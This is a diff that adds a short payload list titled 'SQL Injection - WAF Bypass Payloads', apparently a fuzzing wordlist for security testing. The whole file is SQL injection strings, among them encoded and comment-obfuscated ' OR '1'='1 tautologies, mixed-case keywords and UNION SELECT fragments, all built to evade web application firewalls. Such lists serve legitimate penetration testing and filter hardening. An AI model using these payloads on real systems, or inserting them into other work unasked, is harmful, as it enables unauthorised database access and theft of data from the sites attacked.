@@ -1,0 +1,17 @@
+# SQL Injection - WAF Bypass Payloads
+%27 OR %271%27=%271
+%27%20OR%20%271%27%3D%271
+'/**/OR/**/'1'='1
+'%0aOR%0a'1'='1
+' /*!OR*/ '1'='1
+'%09OR%09'1'='1
+'%0bOR%0b'1'='1
+'+OR+'1'='1
+' OORR '1'='1
+'||'1'='1
+1 aNd 1=1
+1 oR 1=1
+sElEcT * FrOm users
+UNiOn SeLEcT NULL
+UNION%20SELECT
+UNION%09SELECT
